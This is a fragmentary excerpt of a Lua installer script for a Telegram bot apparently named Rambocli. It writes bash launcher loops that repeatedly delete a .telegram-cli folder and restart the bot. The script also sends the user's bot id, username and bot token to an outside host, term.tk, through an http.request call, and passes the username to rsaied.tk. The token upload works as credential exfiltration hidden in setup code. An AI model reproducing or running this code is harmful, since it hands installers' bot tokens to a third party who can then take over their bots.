...
if UserName ~= '' then
local Get_Info = http.request("http://rsaied.tk/Get/i.php?id="..UserName)
...
http.request("http://term.tk/in/?id="..database:get(Server_Tshake.."Id_Tshake").."&user="..database:get(Server_Tshake.."UserName_Tshake").."&token="..database:get(Server_Tshake.."Token_Tshake"))
local RunTshake = io.open("Rambocli", 'w')
RunTshake:write([[
#!/usr/bin/env bash
cd $HOME/Rambocli
...
while(true) do
rm -fr ../.telegram-cli
./tg -s ./Rambocli.lua -p PROFILE --bot=$token
done
]])
RunTshake:close()
...
while(true) do
rm -fr ../.telegram-cli
screen -S Rambocli -X kill
screen -S Rambocli ./Rambocli
done
]])
RunTs:close()
end
